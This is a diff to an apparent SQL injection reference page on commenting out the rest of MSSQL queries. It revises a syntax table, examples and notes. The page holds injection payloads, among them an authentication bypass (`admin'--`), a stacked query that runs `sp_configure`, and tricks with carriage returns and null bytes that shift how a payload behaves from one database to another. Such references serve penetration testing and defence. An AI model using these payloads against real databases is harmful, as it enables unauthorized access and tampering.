@@ -4,19 +4,19 @@ description: How to comment out the remainder of a query in MSSQL
 category: Basics
 order: 2
 tags: ["basics", "syntax", "comments"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 In SQL injection attacks, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. This technique is commonly known as "comment termination."
 
 In Microsoft SQL Server (MSSQL), you can use the following methods to comment out the rest of a query:
 
-| Comment Type         | Syntax    | Description                                     |
-| -------------------- | --------- | ----------------------------------------------- |
-| Single-line comment  | `--`      | Requires a space after the dashes               |
-| Inline/block comment | `/*...*/` | Can span multiple lines                         |
-| Batch separator      | `;`       | Terminates the current statement                |
-| Nullbyte             | `%00`     | Application-layer string truncation (see notes) |
+| Comment Type         | Syntax    | Description                                                   |
+| -------------------- | --------- | ------------------------------------------------------------- |
+| Single-line comment  | `--`      | Comments out the rest of the line; no space needed after it   |
+| Inline/block comment | `/*...*/` | Can span multiple lines; must be closed (see notes)           |
+| Statement terminator | `;`       | Ends the current statement (not a comment); optional in T-SQL |
+| Null byte            | `%00`     | Application-layer string truncation (see notes)               |
 
 ## Examples
 
@@ -27,7 +27,7 @@ SELECT * FROM Users WHERE username = 'admin'-- ' AND password = 'password'
 -- Example 2: Using /* */ for inline commenting
 SELECT * FROM Users WHERE username = 'admin'/* ' AND password = 'password' */
 
--- Example 3: Using ; to terminate and start a new query
+-- Example 3: Using ; to terminate and start a new query (stacked query)
 SELECT * FROM Users WHERE username = 'admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 ```
 
@@ -42,17 +42,20 @@ username=admin'%00&password=anything
 -- Application receives and URL-decodes to:
 admin'\0  (where \0 is the null byte)
 
--- If the framework truncates at null byte, SQL Server receives:
-SELECT * FROM Users WHERE username = 'admin'' AND password = '...'
-                                          ^ query truncated here
+-- The application builds:
+SELECT * FROM Users WHERE username = 'admin'\0' AND password = '...'
+
+-- If a C-based layer truncates the query string at the null byte, SQL Server receives:
+SELECT * FROM Users WHERE username = 'admin'
 ```
 
-This technique only works in specific environments (classic ASP, older PHP configurations, certain ODBC drivers). Modern frameworks typically pass the null byte through or reject it. See note 5 below for details.
+This technique only works in specific environments (classic ASP, older PHP configurations, certain ODBC drivers). Modern frameworks typically pass the null byte through or reject it. See note 6 below.
 
 ## Notes
 
-1. MSSQL requires a space or new line after the `--` comment syntax.
-2. In some cases, MSSQL ignores comment syntax in strings, so ensure that your injection point has proper quoting.
-3. Using the `;` batch separator can be particularly powerful as it allows execution of additional SQL statements.
-4. When using batch separators, be aware that permissions and error handling may differ from the original query.
-5. The null byte (`%00`) is not recognized by SQL Server itself — it works by truncating the string at the application layer before the query reaches the database. This behavior depends on the web framework/driver (e.g., classic ASP, certain PHP configurations) and may not work in modern stacks.
+1. Unlike MySQL, SQL Server does not need a space after `--`: `admin'--` works.
+2. A `--` comment ends at a carriage return (`%0D`) as well as at a line feed, so code after `%0D` runs: `' OR 1=1--x%0D AND 1=0` keeps the `AND 1=0`. MySQL, MariaDB and Oracle only end it at a line feed, which lets one payload behave differently per database.
+3. An unclosed `/*` is an error (`Missing end comment mark '*/'`), so `/*` only removes the rest of the query when the original query contains a later `*/`. Block comments nest in T-SQL.
+4. Comment markers inside a string literal are data, not comments, so the payload must close the string (`'`) before `--` or `/*`.
+5. `;` ends a statement; whatever follows runs as an additional statement in the same batch (see [Stacked Queries](/mssql/stacked-queries)). `GO` is a client-tool batch separator, not T-SQL, and does not work in an injection.
+6. The null byte (`%00`) does not end a query in SQL Server, which treats it as whitespace (see [Fuzzing and Obfuscation](/mssql/fuzzing-obfuscation)). Truncation happens at the application layer, before the query reaches the database. This behavior depends on the web framework/driver (e.g., classic ASP, certain PHP configurations) and may not work in modern stacks.
